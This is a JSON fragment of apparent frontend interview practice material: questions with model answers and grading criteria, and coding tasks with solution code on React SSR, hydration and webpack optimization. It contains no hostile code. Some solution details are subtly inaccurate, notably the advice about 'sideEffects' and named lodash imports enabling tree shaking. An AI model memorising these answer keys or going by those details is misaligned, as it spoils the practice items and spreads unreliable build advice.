ReactDOM.hydrateRoot(\n  document.getElementById('root'),\n  <PostDetail postId={postIdFromUrl} initialPostData={window.__INITIAL_DATA__} />\n);\n```",
          "options": [],
          "analysisPoints": [
            "Implementing server-side data fetching (`async/await` with `fetch`).",
            "Passing fetched data as props to the React component during `renderToString`.",
            "Embedding initial data into the HTML via a `script` tag for client hydration.",
            "Ensuring the client-side hydration logic correctly uses the embedded data.",
            "Handling cases where data fetching might fail."
          ],
          "keyConcepts": [
            "SSR",
            "Data Fetching",
            "Hydration",
            "React",
            "Express",
            "Node.js"
          ],
          "evaluationCriteria": [
            "Correct implementation of server-side data fetching.",
            "Proper embedding and retrieval of initial data.",
            "Seamless integration between server and client rendering logic.",
            "Robustness in handling data loading states."
          ],
          "example": "This solution demonstrates a common pattern for SSR with initial data. The server fetches the data *before* rendering the React component to a string. This `initialPostData` is then passed as a prop to the `PostDetail` component. Crucially, the same data is serialized and embedded into the HTML, typically in a `window.__INITIAL_DATA__` global variable. On the client, `ReactDOM.hydrateRoot` retrieves this data and uses it to initialize the `PostDetail` component's state, preventing a data re-fetch and ensuring the client-side component's state matches the server-rendered markup.",
          "tags": [
            "ssr",
            "react",
            "data-fetching",
            "express",
            "node.js",
            "advanced"
          ],
          "prerequisites": [
            "ssr_basics",
            "react_hooks",
            "async_await"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        },
        {
          "id": "question_ssr_5",
          "topic": "Server-Side Rendering (SSR)",
          "level": "medium",
          "type": "flashcard",
          "question": "What common issue can occur if the HTML generated by the server for SSR does not exactly match what the client-side React application expects to render?",
          "answer": "A 'hydration mismatch' error, which can lead to React throwing warnings, unexpected behavior, or even re-rendering the entire component tree on the client side, negating some SSR benefits.",
          "options": [],
          "analysisPoints": [
            "Understanding of hydration and its dependency on matching DOM.",
            "Awareness of common SSR pitfalls."
          ],
          "keyConcepts": [
            "SSR",
            "Hydration",
            "React",
            "Errors"
          ],
          "evaluationCriteria": [
            "Ability to identify consequences of hydration mismatch"
          ],
          "example": "",
          "tags": [
            "ssr",
            "react",
            "hydration",
            "troubleshooting"
          ],
          "prerequisites": [
            "ssr_basics",
            "react_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ssr_6",
          "topic": "Server-Side Rendering (SSR)",
          "level": "hard",
          "type": "open",
          "question": "Compare and contrast Server-Side Rendering (SSR) with Client-Side Rendering (CSR) and Static Site Generation (SSG) in terms of initial load performance, SEO, and development complexity.",
          "answer": "**Server-Side Rendering (SSR)**\n*   **Initial Load Performance:** Good. Sends fully rendered HTML to the browser quickly, leading to faster First Contentful Paint (FCP). Time To Interactive (TTI) might be slower than SSG if bundles are large, but faster than CSR.\n*   **SEO:** Excellent. Search engine crawlers receive full HTML content directly, which is easily indexed.\n*   **Development Complexity:** High. Requires a Node.js server, managing server and client bundles, data hydration, and handling server-specific APIs/logic.\n\n**Client-Side Rendering (CSR)**\n*   **Initial Load Performance:** Poor for first load. Sends a minimal HTML file (often just a `div#root`) and relies on JavaScript to fetch data and build the DOM. Leads to slower FCP.\n*   **SEO:** Fair/Challenging. Modern crawlers can execute JavaScript, but it's less reliable and can be slower for indexing than server-rendered content. Requires careful handling (e.g., pre-rendering, dynamic rendering).\n*   **Development Complexity:** Lower. Simpler build process (one bundle), no server-side concerns beyond serving static files.\n\n**Static Site Generation (SSG)**\n*   **Initial Load Performance:** Excellent. HTML is pre-built at compile time and served as static files via a CDN. Extremely fast FCP and TTI.\n*   **SEO:** Excellent. Full HTML available at build time, optimized for crawlers.\n*   **Development Complexity:** Medium. Requires a build process to generate static files. Best for content that doesn't change frequently or requires immediate updates. More complex for dynamic, highly personalized content (might use client-side fetching after initial load).\n\n**Summary Table:**\n\n| Feature              | SSR (Server-Side Rendering)                                     | CSR (Client-Side Rendering)                                | SSG (Static Site Generation)                                 |\n| :------------------- | :-------------------------------------------------------------- | :--------------------------------------------------------- | :----------------------------------------------------------- |\n| **FCP**              | Fast (full HTML on first byte)                                  | Slow (empty HTML, needs JS to render)                      | Very Fast (pre-built HTML, often CDN-served)                 |\n| **TTI**              | Variable (depends on hydration, usually slower than FCP)        | Variable (depends on JS load/execution, often slower FCP)  | Very Fast (JS for interactivity loads after static content)  |\n| **SEO**              | Excellent (full HTML for crawlers)                              | Fair/Challenging (requires JS execution by crawler)        | Excellent (full HTML pre-built)                              |\n| **Data Freshness**   | Real-time (data fetched on each request)                        | Real-time (data fetched client-side)                       | Stale at build time (requires re-deploy for updates)         |\n| **Server Load**      | High (renders on each request)                                  | Low (serves static files)                                  | None (serves static files, built once)                       |\n| **Complexity**       | High (server, client, hydration, two build processes)           | Low (simple static serving)                                | Medium (build process, data fetching at build time)          |\n| **Best Use Case**    | Dynamic, personalized content requiring good SEO and fast FCP   | Highly interactive apps, dashboards (less SEO critical)    | Content-heavy, rarely changing sites (blogs, marketing)      |",
          "options": [],
          "analysisPoints": [
            "Comprehensive understanding of rendering strategies.",
            "Ability to articulate pros and cons across multiple dimensions (performance, SEO, complexity).",
            "Clear differentiation between each rendering type.",
            "Structured and organized comparison."
          ],
          "keyConcepts": [
            "SSR",
            "CSR",
            "SSG",
            "Performance",
            "SEO",
            "Architecture",
            "Web Rendering"
          ],
          "evaluationCriteria": [
            "Depth and accuracy of the comparison.",
            "Clarity and conciseness of explanations.",
            "Ability to synthesize complex information.",
            "Identification of appropriate use cases for each strategy."
          ],
          "example": "",
          "tags": [
            "ssr",
            "csr",
            "ssg",
            "architecture",
            "performance",
            "seo",
            "comparison"
          ],
          "prerequisites": [
            "web_fundamentals",
            "react_basics"
          ],
          "complexity": 10,
          "interviewFrequency": 10,
          "learningPath": "expert"
        }
      ],
      "tasks": [
        {
          "id": "task_bundle_analyzer_1",
          "title": "Integrate and Configure Webpack Bundle Analyzer",
          "description": "\nYour task is to integrate `webpack-bundle-analyzer` into an existing webpack configuration. You need to:\n\n1.  Install the necessary package.\n2.  Add `BundleAnalyzerPlugin` to the webpack configuration.\n3.  Configure the plugin to generate a static HTML report named `analyzer-report.html` in your `dist` directory, without automatically opening the report in the browser.\n\nThis setup is typical for CI/CD environments where you want to review bundle statistics after a build.\n",
          "difficulty": "medium",
          "startingCode": "const path = require('path');\n// const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin; // Uncomment after npm install\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  plugins: [\n    // TODO: Add the BundleAnalyzerPlugin here with the specified configuration\n  ],\n  // Assume src/index.js and other necessary files exist\n};\n",
          "solutionCode": "const path = require('path');\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  plugins: [\n    new BundleAnalyzerPlugin({\n      analyzerMode: 'static',      // Generate a static HTML file\n      openAnalyzer: false,         // Prevent opening the browser automatically\n      reportFilename: path.resolve(__dirname, 'dist', 'analyzer-report.html') // Specify output path and filename\n    })\n  ],\n};\n",
          "testCases": [
            "Verify `webpack-bundle-analyzer` is listed as a dev dependency in `package.json`.",
            "Run `webpack` command (e.g., `npx webpack --config webpack.config.js`).",
            "Check that `dist/analyzer-report.html` file is generated.",
            "Confirm that a browser window does NOT automatically open after the build."
          ],
          "hints": [
            "Remember to run `npm install webpack-bundle-analyzer --save-dev` first.",
            "Look into the plugin's documentation for options to control the analyzer mode and whether to open the browser.",
            "`path.resolve` is useful for constructing absolute file paths."
          ],
          "tags": [
            "webpack",
            "tooling",
            "performance",
            "optimization",
            "ci-cd"
          ],
          "timeEstimate": 20,
          "prerequisites": [
            "webpack_basics",
            "npm_package_management"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "bundle_analysis",
            "webpack_plugins"
          ]
        },
        {
          "id": "task_tree_shaking_1",
          "title": "Optimize Imports for Tree Shaking",
          "description": "\nYour task is to refactor a JavaScript application to improve its tree-shaking efficiency, specifically focusing on `lodash` imports. You have an `index.js` file that uses `lodash` functions.\n\n**Requirements:**\n1.  **Refactor `index.js`:** Change the `lodash` imports from global/bad practices to tree-shakable ES Module imports.\n2.  **Ensure functionality:** The application should continue to work correctly.\n3.  **Explain the improvement:** Briefly explain why the refactored code is better for bundle size.\n\nAssume you have `lodash` and `lodash-es` installed.\n",
          "difficulty": "medium",
          "startingCode": "// src/index.js\nimport lodash from 'lodash';\n\nconst array = [1, 2, 3, 4, 5];\n\n// Usage 1: Get a chunk of the array\nconst chunkedArray = lodash.chunk(array, 2);\nconsole.log('Chunked Array:', chunkedArray);\n\n// Usage 2: Flatten a nested array\nconst nestedArray = [1, [2, 3], 4];\nconst flattenedArray = lodash.flatten(nestedArray);\nconsole.log('Flattened Array:', flattenedArray);\n\n// Usage 3: Find the maximum value (assume this is used elsewhere but not shown)\n// const maxVal = lodash.max(array);\n\n// TODO: Refactor the imports and usage to enable better tree shaking\n",
          "solutionCode": "// src/index.js\n// Import only the specific functions needed using ES module paths or lodash-es\nimport chunk from 'lodash/chunk';      // Preferred for direct module import\nimport { flatten } from 'lodash-es'; // Alternative if specific path is not available or less convenient\n\nconst array = [1, 2, 3, 4, 5];\n\n// Usage 1: Get a chunk of the array\nconst chunkedArray = chunk(array, 2);\nconsole.log('Chunked Array:', chunkedArray);\n\n// Usage 2: Flatten a nested array\nconst nestedArray = [1, [2, 3], 4];\nconst flattenedArray = flatten(nestedArray);\nconsole.log('Flattened Array:', flattenedArray);\n\n// Usage 3: Find the maximum value (if `max` was not used, it would be tree-shaken)\n// If 'max' was actually needed, it would be imported: `import max from 'lodash/max';`\n\n/*\nExplanation of Improvement:\nOriginal: `import lodash from 'lodash';` imports the entire lodash library (often the CommonJS build),\nmaking the bundler unable to remove unused functions like `max` even if they're not explicitly called.\n\nRefactored: `import chunk from 'lodash/chunk';` and `import { flatten } from 'lodash-es';`\nuse ES Module syntax or direct paths to specific functions. This allows modern bundlers (like Webpack)\nwith tree shaking enabled to statically analyze the imports. Only the `chunk` and `flatten` functions\n(and their minimal dependencies) will be included in the final bundle. Any other lodash functions\nthat are not explicitly imported and used will be 'shaken off', significantly reducing bundle size.\n*/\n",
          "testCases": [
            "Run the refactored code to ensure `chunkedArray` and `flattenedArray` are correctly calculated.",
            "Simulate a webpack build (e.g., using a basic `webpack.config.js` in production mode) and verify that the bundle size is smaller than with the original `lodash` import, ideally by inspecting the bundle with a tool like `webpack-bundle-analyzer`.",
            "Check that `console.log` outputs match the expected results from the `chunk` and `flatten` operations."
          ],
          "hints": [
            "Recall the 'Good' and 'Even Better' examples for `lodash` imports from the theory.",
            "Consider which version of `lodash` is optimized for ES Modules.",
            "The goal is to import only what's explicitly used."
          ],
          "tags": [
            "tree-shaking",
            "optimization",
            "lodash",
            "javascript",
            "es-modules"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "javascript_modules",
            "webpack_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "bundle_size_reduction",
            "dead_code_elimination"
          ]
        },
        {
          "id": "task_webpack_prod_config_1",
          "title": "Optimize Webpack for Production Performance",
          "description": "\nYour team needs to optimize a webpack configuration for a production environment to ensure maximum performance and caching efficiency.\n\n**Requirements:**\n1.  Set `mode` to `'production'`.\n2.  Configure `output` to use `[contenthash]` for both main bundle filenames and chunk filenames (`.chunk.js`).\n3.  Enable CSS extraction into separate files with content hashing using `MiniCssExtractPlugin`.\n4.  Enable JavaScript and CSS minification using `TerserPlugin` and `CssMinimizerPlugin`.\n5.  Implement aggressive code splitting for all chunks (`chunks: 'all'`, `minSize: 0`, `maxInitialRequests: Infinity`) with a `vendor` cache group that names chunks `npm.<packageName>`.\n6.  Extract the webpack runtime into a `single` chunk.\n7.  Add `CompressionPlugin` to generate gzipped assets.\n8.  Ensure stable module IDs across builds using `webpack.ids.HashedModuleIdsPlugin`.\n\nAssume all necessary plugins (`MiniCssExtractPlugin`, `CssMinimizerPlugin`, `TerserPlugin`, `CompressionPlugin`) are installed. You can also assume `babel-loader` is configured for `.js` files and `css-loader` for `.css` files.\n",
          "difficulty": "hard",
          "startingCode": "const path = require('path');\nconst webpack = require('webpack'); // Needed for webpack.ids.HashedModuleIdsPlugin\n\n// Plugins to be used (assume they are installed)\n// const MiniCssExtractPlugin = require('mini-css-extract-plugin');\n// const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');\n// const TerserPlugin = require('terser-webpack-plugin');\n// const CompressionPlugin = require('compression-webpack-plugin');\n\nmodule.exports = {\n  // TODO: Set mode to production\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    // TODO: Configure filename and chunkFilename with contenthash\n    filename: 'bundle.js',\n    chunkFilename: '[name].js',\n    clean: true, // Good practice to clean dist folder\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        // TODO: Use MiniCssExtractPlugin.loader here\n        use: ['style-loader', 'css-loader'], \n      },\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: 'babel-loader',\n      },\n    ],\n  },\n  optimization: {\n    // TODO: Configure minimization, minimizers, splitChunks, and runtimeChunk\n  },\n  plugins: [\n    // TODO: Add MiniCssExtractPlugin, CompressionPlugin, and HashedModuleIdsPlugin\n  ],\n};\n",
          "solutionCode": "const path = require('path');\nconst webpack = require('webpack');\nconst MiniCssExtractPlugin = require('mini-css-extract-plugin');\nconst CssMinimizerPlugin = require('css-minimizer-webpack-plugin');\nconst TerserPlugin = require('terser-webpack-plugin');\nconst CompressionPlugin = require('compression-webpack-plugin');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: '[name].[contenthash].js',\n    chunkFilename: '[name].[contenthash].chunk.js',\n    clean: true,\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        use: [MiniCssExtractPlugin.loader, 'css-loader'],\n      },\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: 'babel-loader',\n      },\n    ],\n  },\n  optimization: {\n    minimize: true,\n    minimizer: [\n      new TerserPlugin({\n        parallel: true,\n        terserOptions: {\n          compress: {\n            drop_console: true,\n          },\n          format: {\n            comments: false,\n          },\n        },\n        extractComments: false,\n      }),\n      new CssMinimizerPlugin(),\n    ],\n    splitChunks: {\n      chunks: 'all',\n      maxInitialRequests: Infinity,\n      minSize: 0,\n      cacheGroups: {\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name(module) {\n            const packageName = module.context.match(/[\\\\/]node_modules[\\\\/](.+?)(?:[\\\\/]|$)/)[1];\n            return `npm.${packageName.replace('@', '')}`;\n          },\n          priority: 20,\n          enforce: true,\n        },\n        defaultVendors: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          priority: 10,\n          reuseExistingChunk: true,\n        },\n        common: {\n          minChunks: 2,\n          priority: -10,\n          reuseExistingChunk: true,\n        },\n        default: {\n          minChunks: 2,\n          priority: -20,\n          reuseExistingChunk: true,\n        },\n      },\n    },\n    runtimeChunk: 'single',\n  },\n  plugins: [\n    new MiniCssExtractPlugin({\n      filename: '[name].[contenthash].css',\n    }),\n    new CompressionPlugin({\n      test: /\\.js$|\\.css$|\\.html$|\\.svg$/,\n      threshold: 8192,\n      minRatio: 0.8,\n    }),\n    new webpack.ids.HashedModuleIdsPlugin(),\n  ],\n};\n",
          "testCases": [
            "Run `npx webpack --config webpack.config.js`.",
            "Check `dist` folder: Verify `bundle.[contenthash].js`, `[name].[contenthash].chunk.js`, and `[name].[contenthash].css` files exist.",
            "Verify `dist` folder: Look for `runtime.[contenthash].js` and gzipped `.gz` or `.br` versions of your assets (e.g., `bundle.js.gz`, `main.css.gz`).",
            "Inspect bundle sizes using `webpack-bundle-analyzer` (if configured) to confirm minification and code splitting effectiveness.",
            "Make a small change to `src/index.js` and rebuild; verify only `runtime` and the affected JS chunks' hashes change, not all others (due to stable module IDs)."
          ],
          "hints": [
            "Remember that `MiniCssExtractPlugin.loader` is used in `module.rules` for CSS.",
            "`TerserPlugin` and `CssMinimizerPlugin` go into `optimization.minimizer`.",
            "The `name` function in `cacheGroups` is crucial for creating distinct vendor chunk names.",
            "`webpack.ids.HashedModuleIdsPlugin` is part of the `webpack` object directly.",
            "Consider `clean: true` in `output` to ensure a clean build directory."
          ],
          "tags": [
            "webpack",
            "performance",
            "optimization",
            "production",
            "caching",
            "code-splitting",
            "plugins"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "webpack_basics",
            "webpack_plugins",
            "webpack_loaders",
            "javascript_modules"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "relatedConcepts": [
            "bundle_size_reduction",
            "caching_strategies",
            "front_end_architecture"
          ]
        },
        {
          "id": "task_webpack_prod_config_2",
          "title": "Debug Webpack Production Bundle Size",
          "description": "\nYou are given a `webpack.config.js` and `package.json` for a React application. The production bundle size is unexpectedly large (e.g., 2MB+), and you suspect a third-party library is being fully included without proper tree shaking. \n\n**Your task is to:**\n1.  Identify the likely cause of poor tree shaking for `lodash` based on the provided `package.json` and a common `webpack.config.js` setup.\n2.  Modify the `webpack.config.js` and suggest a change to `package.json` to enable better tree shaking for such libraries.\n\n**`package.json` (partial):**\n```json\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\",\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\"\n  },\n  \"scripts\": {\n    \"build\": \"webpack --config webpack.config.js\"\n  },\n  \"main\": \"dist/main.js\",\n  \"module\": \"dist/es/main.js\" // This field indicates an ES module entry point\n}\n```\n\n**`webpack.config.js` (partial):**\n```javascript\nconst path = require('path');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: { presets: ['@babel/preset-env', '@babel/preset-react'] }\n        }\n      }\n    ]\n  },\n  // optimization: { /* Nothing specific for tree shaking here */ }\n};\n```\n\n**`src/index.js` (partial):**\n```javascript\nimport _ from 'lodash';\n\nconst numbers = [1, 2, 3, 4];\nconst doubled = _.map(numbers, n => n * 2);\nconsole.log(doubled);\n\n// Assume other lodash functions like _.debounce, _.throttle are *not* used\n// elsewhere in the application.\n```\n",
          "difficulty": "hard",
          "startingCode": "const path = require('path');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: { presets: ['@babel/preset-env', '@babel/preset-react'] }\n        }\n      }\n    ]\n  },\n  // TODO: Add optimization for tree shaking\n};\n\n// src/index.js (for context)\n/*\nimport _ from 'lodash';\nconst numbers = [1, 2, 3, 4];\nconst doubled = _.map(numbers, n => n * 2);\nconsole.log(doubled);\n*/\n\n// package.json (for context)\n/*\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\",\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\"\n  },\n  \"scripts\": {\n    \"build\": \"webpack --config webpack.config.js\"\n  },\n  \"main\": \"dist/main.js\",\n  \"module\": \"dist/es/main.js\"\n}\n*/\n",
          "solutionCode": "// webpack.config.js\nconst path = require('path');\n\nmodule.exports = {\n  mode: 'production',\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.js',\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: { presets: ['@babel/preset-env', '@babel/preset-react'] }\n        }\n      }\n    ]\n  },\n  optimization: {\n    usedExports: true, // Crucial for marking unused exports\n    minimize: true,    // Essential for TerserPlugin to remove dead code\n    minimizer: [\n      new (require('terser-webpack-plugin'))(), // Add TerserPlugin for minification and dead code removal\n    ],\n  },\n};\n\n// src/index.js (Refactored for better tree shaking)\n/*\nimport { map } from 'lodash'; // Using named import directly from lodash, which works if lodash's package.json has 'module' field set correctly, or better: 'lodash-es'\n// OR: import map from 'lodash/map'; // Even better: direct module import if available and side-effect free\n\nconst numbers = [1, 2, 3, 4];\nconst doubled = map(numbers, n => n * 2);\nconsole.log(doubled);\n*/\n\n// package.json (Suggested change)\n/*\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\",\n    \"react\": \"^18.2.0\",\n    \"react-dom\": \"^18.2.0\"\n  },\n  \"scripts\": {\n    \"build\": \"webpack --config webpack.config.js\"\n  },\n  \"main\": \"dist/main.js\",\n  \"module\": \"dist/es/main.js\",\n  \"sideEffects\": false // <--- ADD THIS LINE to allow webpack to safely tree-shake\n}\n*/\n",
          "testCases": [
            "**Original Problem Diagnosis:** Explain why `import _ from 'lodash';` and the missing `optimization` config lead to poor tree shaking for `lodash`.",
            "**Proposed `src/index.js` Refactoring:** Show the import change from `import _ from 'lodash';` to `import { map } from 'lodash';` (or `import map from 'lodash/map';` for best practice).",
            "**Proposed `webpack.config.js` Changes:** Ensure `optimization.usedExports: true` is set (it's default in production, but good to show intent) and `TerserPlugin` is included in `optimization.minimizer`.",
            "**Proposed `package.json` Change:** Suggest adding `\"sideEffects\": false` to the application's `package.json` (or the `lodash` package's `package.json` if you were the library author, but for this task, it's about *your* app's configuration for the library)."
          ],
          "hints": [
            "Focus on the `import` statement in `src/index.js` and how it affects static analysis.",
            "Recall the prerequisites for effective tree shaking mentioned in the theory.",
            "Think about what webpack needs to know to safely remove unused code, beyond just using ES Modules.",
            "What webpack `optimization` settings are specifically related to identifying and removing unused exports?"
          ],
          "tags": [
            "webpack",
            "tree-shaking",
            "optimization",
            "bundle-size",
            "debugging",
            "performance"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "webpack_optimization",
            "tree_shaking_theory",
            "javascript_modules"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "dead_code_elimination",
            "package_json_side_effects",
            "terser_plugin"
          ]
        },
        {
          "id": "task_ssr_1",
          "title": "Implement Basic React Server-Side Rendering with Express",
          "description": "\nYour task is to set up a basic React Server-Side Rendering (SSR) application using Express. You will create a simple React component, configure an Express server to render it to HTML, and ensure the client-side React code hydrates this server-generated HTML.\n\n**Requirements:**\n1.  Create a simple React `App` component (e.g., displaying a greeting and a counter).\n2.  Set up an Express server to handle all routes (`app.get('*')`).\n3.  On the server, use `react-dom/server.renderToString` to convert the React `App` component into an HTML string.\n4.  Embed the server-rendered HTML into a basic HTML template.\n5.  Include a `<script>` tag in the HTML template that points to a client-side bundle (e.g., `/bundle.js`).\n6.  On the client side, use `ReactDOM.hydrateRoot` (for React 18+) to hydrate the server-generated HTML.\n7.  Assume two webpack configurations: `webpack.client.js` and `webpack.server.js` are used to build `dist/bundle.js` and `dist/server.bundle.js` respectively. The task focuses on `server.js` and `src/index.js`.\n\n**Provided Files (conceptual):**\n*   `src/App.js` (Your React component)\n*   `src/index.js` (Client-side entry point)\n*   `server.js` (Express server entry point)\n*   `dist/bundle.js` (Client-side webpack output)\n\n",
          "difficulty": "hard",
          "startingCode": "// server.js\nimport express from 'express';\nimport React from 'react';\nimport { renderToString } from 'react-dom/server';\nimport App from './src/App'; // Your React root component\nimport path from 'path';\n\nconst app = express();\n\n// Serve static files from the 'dist' directory (for client-side bundle)\napp.use(express.static(path.resolve(__dirname, 'dist')));\n\napp.get('*', (req, res) => {\n  // TODO: Render React App to HTML string\n  const html = '<!-- TODO: Server-rendered HTML here -->';\n  \n  res.send(`\n    <!DOCTYPE html>\n    <html>\n      <head>\n        <title>My SSR App</title>\n      </head>\n      <body>\n        <div id=\"root\">${html}</div>\n        <script src=\"/bundle.js\"></script> <!-- Client-side bundle for hydration -->\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => {\n  console.log('Server is listening on port 3000');\n});\n\n// src/App.js\nimport React, { useState } from 'react';\n\nfunction App() {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <h1>Hello SSR!</h1>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n    </div>\n  );\n}\n\nexport default App;\n\n// src/index.js\nimport React from 'react';\nimport ReactDOM from 'react-dom/client'; // For React 18+\nimport App from './App';\n\n// TODO: Hydrate the application\n// const root = ReactDOM.createRoot(document.getElementById('root'));\n// root.render(<App />); // This is for CSR, change for SSR hydration\n",
          "solutionCode": "// server.js\nimport express from 'express';\nimport React from 'react';\nimport { renderToString } from 'react-dom/server';\nimport App from './src/App';\nimport path from 'path';\n\nconst app = express();\n\napp.use(express.static(path.resolve(__dirname, 'dist')));\n\napp.get('*', (req, res) => {\n  const html = renderToString(<App />); // Render React App to HTML string\n  \n  res.send(`\n    <!DOCTYPE html>\n    <html>\n      <head>\n        <title>My SSR App</title>\n      </head>\n      <body>\n        <div id=\"root\">${html}</div>\n        <script src=\"/bundle.js\"></script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => {\n  console.log('Server is listening on port 3000');\n});\n\n// src/App.js\nimport React, { useState } from 'react';\n\nfunction App() {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <h1>Hello SSR!</h1>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n    </div>\n  );\n}\n\nexport default App;\n\n// src/index.js\nimport React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport App from './App';\n\n// Hydrate the application using ReactDOM.hydrateRoot for React 18+\nconst root = ReactDOM.hydrateRoot(\n  document.getElementById('root'),\n  <App />\n);\n",
          "testCases": [
            "Run the Node.js server (`node server.js` after building).",
            "Open browser to `http://localhost:3000`.",
            "View page source (Ctrl+U or Cmd+Option+U): Verify that the initial HTML contains the `<h1>Hello SSR!</h1>` and `<p>Count: 0</p>` elements, meaning it was server-rendered.",
            "Interact with the page: Click the 'Increment' button. Verify the counter updates, indicating client-side React has successfully hydrated and taken over.",
            "Check browser console for hydration errors (e.g., 'Warning: Expected server HTML to contain a matching...'). There should be none."
          ],
          "hints": [
            "Remember to use `renderToString` from `react-dom/server` on the server.",
            "On the client, for React 18+, use `ReactDOM.hydrateRoot` instead of `ReactDOM.createRoot` to attach to existing HTML.",
            "Ensure the server serves the client-side JavaScript bundle correctly (e.g., using `express.static`).",
            "The `div` with `id=\"root\"` is critical for both server rendering and client hydration."
          ],
          "tags": [
            "ssr",
            "react",
            "express",
            "node.js",
            "frontend-architecture"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_basics",
            "node.js_basics",
            "express_basics",
            "webpack_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "hydration",
            "render_to_string",
            "client_server_architecture"
          ]
        }
      ]
    }
  },
  {
    "id": "460ee28e-203f-4b26-bf47-da77a1ba06fc",
    "startLine": 12400,
    "endLine": 12499,
    "processedDate": "2025-06-17T12:53:51.914Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_deployment_checklist",
          "title": "Deployment Checklist for Frontend Applications",
          "content": "Optimizing a frontend application for production involves several crucial steps to ensure speed, efficiency, and reliability. This deployment checklist covers key areas to improve user experience and reduce operational costs.\n\n## Key Concepts\n- **Bundle Minification**: Reduces the size of JavaScript and CSS files by removing unnecessary characters like whitespace, comments, and shorting variable names without changing their functionality. This speeds up download times.\n- **Tree Shaking**: A form of dead code elimination. It removes unused code from the final bundle, especially effective with ES modules, further reducing bundle size.\n- **Code Splitting**: Divides the application's code into smaller, on-demand chunks. This allows the browser to load only the necessary code for a given view or feature, improving initial load times.\n- **Cache Optimizations**: Uses techniques like content hashing (adding a hash of the file's content to its filename) to enable aggressive caching by browsers and CDNs. When content changes, the hash changes, invalidating the old cache and ensuring users get the latest version.\n- **Gzip Compression**: A data compression method that significantly reduces the size of text-based assets (HTML, CSS, JavaScript) before they are sent from the server to the client. The browser then decompresses them.\n- **Image Optimization**: Involves compressing images to reduce file size without significant loss of quality, and serving them in modern formats (like WebP) or at appropriate resolutions. This is critical as images often contribute most to page weight.\n- **Critical CSS**: Extracts and inlines the minimum CSS required for the 'above-the-fold' content (what's visible without scrolling) directly into the HTML. This allows the browser to render the initial view faster, preventing a flash of unstyled content (FOUC).\n- **Service Workers**: Scripts that run in the background, separate from the web page, enabling features like offline capabilities, push notifications, and advanced caching strategies. They act as a proxy between the browser and the network.\n- **CDN Usage (Content Delivery Network)**: A geographically distributed network of servers that caches static assets (images, CSS, JS) closer to users. This reduces latency and improves loading speeds by serving content from the nearest server.\n- **Error Monitoring**: Implementing production error logging and reporting tools to proactively identify and fix issues that users encounter, improving the application's reliability and stability.\n\nThese techniques collectively aim to reduce load times, improve interactivity, and enhance the overall performance and user experience of a web application.",
          "examples": [
            {
              "id": "example_minification_1",
              "title": "Minification Example",
